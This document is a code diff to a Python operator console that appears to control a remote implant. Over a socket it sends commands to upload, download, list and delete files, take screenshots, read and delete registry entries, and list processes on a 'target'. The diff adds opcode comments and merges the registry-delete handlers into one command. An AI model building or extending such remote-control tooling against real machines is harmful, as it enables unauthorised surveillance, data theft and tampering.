@@ -62,6 +62,7 @@ def handleInput(ip, port):
         userInput = input("> ")
         userInput = userInput.lower()
 
+        # PUT == 1
         if (userInput == "putfile"):
             printPutFileHelp()
             user_input = input("> ")
@@ -83,6 +84,7 @@ def handleInput(ip, port):
 
             putFile(sock, filepath, outputfilepath, overwrite)
 
+        # GET == 2
         elif (userInput == "getfile"):
             printGetFileHelp()
             user_input = input("> ")
@@ -102,6 +104,7 @@ def handleInput(ip, port):
             
             getFile(sock, filepath, outfilepath, overwrite)
 
+        # DIR == 3
         elif(userInput == "dirlist"):
             printDirListHelp()
             user_input = input("> ")
@@ -113,17 +116,19 @@ def handleInput(ip, port):
 
             dirList(sock, dirPath)
 
+        # DEL == 4
         elif(userInput == "deletefile"):
             printDeleteFileHelp()
             user_input = input("> ")
             parser = argparse.ArgumentParser(description='Perform a delete file off target')
-            parser.add_argument('-filepath', '--filepath', type=str, help='Path to the file we''re deleting off target', action='store', required=True)
+            parser.add_argument('-filepath', '--filepath', type=str, help='Path to the file we are deleting off target', action='store', required=True)
             args = parser.parse_args(user_input.split())
             
             filePath = bytes(args.filepath, 'utf-8')
 
             deleteFile(sock, filePath)
 
+        # SCREENSHOT == 5
         elif(userInput == "screenshot"):
             printScreenshotHelp()
             user_input = input("> ")
@@ -135,11 +140,12 @@ def handleInput(ip, port):
 
             screenshot(sock, filePath)
 
+        # REGREAD == 6
         elif (userInput == "regread"):
             printRegReadHelp()
             user_input = input("> ")
             parser = argparse.ArgumentParser(description='Perform a registry read off target')
-            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key we''re reading', action='store', required=True)
+            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key we are reading', action='store', required=True)
             parser.add_argument('-value', '--value', type=str, help='Name of the value we want to read', action='store', required=True)
             args = parser.parse_args(user_input.split())
 
@@ -148,33 +154,27 @@ def handleInput(ip, port):
 
             regRead(sock, keyPath, value)
 
-
-        elif (userInput == "regdeletekey"):
-            #printRegDeleteHelp()
+        # REGDELETE == 9
+        elif (userInput == "regdelete"):
+            printRegDeleteHelp()
             user_input = input("> ")
-            parser = argparse.ArgumentParser(description='Delete a registry key off target')
-            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key we''re reading', action='store', required=True)
-            parser.add_argument('-value', '--value', type=str, help='Name of the value we want to read', action='store', required=True)
+            parser = argparse.ArgumentParser(description='Delete a registry key/value off target')
+            parser.add_argument('-iskey', '--iskey', type=bool, help='The value being passed is a subkey we are deleting, not a value - if not passed it is assumed a value', required=False, action='store_true')
+            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key that contains the key/value we are deleting', action='store', required=True)
+            parser.add_argument('-value', '--value', type=str, help='Name of the value/key we want to delete', action='store', required=True)
             args = parser.parse_args(user_input.split())
+
+            if (args.iskey):
+                isKey = True
+            else:
+                isKey = False
 
             keyPath = bytes(args.keypath, 'utf-8')
             value = bytes(args.value, 'utf-8')
 
-            regRead(sock, keyPath, value)
+            regDelete(sock, isKey, keyPath, value)
 
-        elif (userInput == "regdeletevalue"):
-            #printRegDeleteHelp()
-            user_input = input("> ")
-            parser = argparse.ArgumentParser(description='Delete a registry key off target')
-            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key we''re reading', action='store', required=True)
-            parser.add_argument('-value', '--value', type=str, help='Name of the value we want to read', action='store', required=True)
-            args = parser.parse_args(user_input.split())
-
-            keyPath = bytes(args.keypath, 'utf-8')
-            value = bytes(args.value, 'utf-8')
-
-            regRead(sock, keyPath, value)
-
+        # PROCESSLIST == 10
         elif (userInput == "processlist"):
             printProcessListHelp()
             processList(sock)
